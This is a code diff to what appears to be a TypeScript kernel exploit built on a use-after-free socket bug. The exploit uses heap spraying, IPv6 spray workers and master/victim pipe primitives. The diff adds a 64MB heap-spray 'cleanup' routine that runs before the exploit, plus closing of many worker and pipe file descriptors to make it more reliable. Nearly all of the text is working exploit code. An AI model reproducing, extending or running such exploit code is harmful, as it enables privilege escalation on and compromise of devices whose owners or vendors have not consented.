@@ -267,6 +267,33 @@ function set_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt
   return result
 }
 
+function heap_cleanup () {
+  debug('Performing heap cleanup...')
+  const payload = new Uint8Array(0x10000) // 64KB
+  const heavy_spray = []
+
+  // Allocate ~64MB to force GC and clear old objects
+  for (let i = 0; i < 1000; i++) {
+    heavy_spray.push(new Uint8Array(payload))
+  }
+
+  // Release references
+  for (let i = 0; i < heavy_spray.length; i++) {
+    heavy_spray[i] = null as any
+  }
+
+  // Trigger GC (best effort)
+  try {
+    // @ts-ignore
+    if (typeof gc !== 'undefined') {
+      // @ts-ignore
+      gc()
+    }
+  } catch (e) { }
+
+  debug('Heap cleanup done')
+}
+
 // Global buffer to minimize footprint
 const sockopt_len_ptr = malloc(4)
 
@@ -659,6 +686,7 @@ let prev_rtprio: number = -1
 let cleanup_called: boolean = false
 
 function setup () {
+  heap_cleanup() // Attempt to cleanup heap before exploit
   debug('Preparing netctrl...')
 
   prev_core = get_current_core()
@@ -791,6 +819,50 @@ function cleanup (kill_workers = false) {
   close(new BigInt(iov_sock_1))
   close(new BigInt(iov_sock_0))
 
+  // Close worker pipes
+  for (let i = 0; i < IOV_THREAD_NUM; i++) {
+    const worker = iov_recvmsg_workers[i]
+    if (worker !== undefined) {
+      close(new BigInt(worker.pipe_0))
+      close(new BigInt(worker.pipe_1))
+    }
+  }
+
+  for (let i = 0; i < UIO_THREAD_NUM; i++) {
+    const worker = uio_readv_workers[i]
+    if (worker !== undefined) {
+      close(new BigInt(worker.pipe_0))
+      close(new BigInt(worker.pipe_1))
+    }
+  }
+
+  for (let i = 0; i < UIO_THREAD_NUM; i++) {
+    const worker = uio_writev_workers[i]
+    if (worker !== undefined) {
+      close(new BigInt(worker.pipe_0))
+      close(new BigInt(worker.pipe_1))
+    }
+  }
+
+  if (spray_ipv6_worker !== undefined) {
+    close(new BigInt(spray_ipv6_worker.pipe_0))
+    close(new BigInt(spray_ipv6_worker.pipe_1))
+  }
+
+  // Close master and victim pipes
+  if (masterRpipeFd !== undefined && masterRpipeFd > 0) {
+    close(new BigInt(masterRpipeFd))
+  }
+  if (masterWpipeFd !== undefined && masterWpipeFd > 0) {
+    close(new BigInt(masterWpipeFd))
+  }
+  if (victimRpipeFd !== undefined && victimRpipeFd > 0) {
+    close(new BigInt(victimRpipeFd))
+  }
+  if (victimWpipeFd !== undefined && victimWpipeFd > 0) {
+    close(new BigInt(victimWpipeFd))
+  }
+
   // Skip uaf_socket - hangs
   // if (uaf_socket !== undefined) {
   //   close(new BigInt(uaf_socket))
@@ -804,7 +876,7 @@ function cleanup (kill_workers = false) {
 
   set_rtprio(prev_rtprio)
 
-  debug('Cleanup completed')
+  debug('Cleanup completed - all FDs released')
 }
 
 function fill_buffer_64 (buf: BigInt, val: BigInt, len: number) {
